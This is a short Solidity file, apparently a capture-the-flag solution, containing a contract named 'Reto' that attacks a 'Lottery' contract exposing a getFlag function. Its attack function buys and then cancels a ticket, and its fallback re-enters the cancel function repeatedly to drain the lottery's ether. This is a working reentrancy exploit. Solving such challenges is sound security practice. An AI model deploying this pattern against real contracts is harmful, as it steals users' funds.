// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface Lottery {
    function pagarBoleto() external payable;
    function ganarLottery(uint _number) external payable returns (string memory);
    function intentos() external view returns (uint);
    function balanceTotal() external view returns (uint);
    function anularBoleto() external;
    function getFlag() external view returns (string memory);
}

pragma solidity ^0.8.4;

contract Reto {
    Lottery public lottery;

    constructor(Lottery _lottery) {
        lottery = _lottery;
    }
    fallback() external payable {
        if(address(lottery).balance > 0 ) {
            lottery.anularBoleto();
        }

    }
    function attack() external payable {
        require(msg.value>0,"hay que comprar boleto");
        lottery.pagarBoleto{value: msg.value}();
        lottery.anularBoleto();
    }
    

        
    

}
//1000000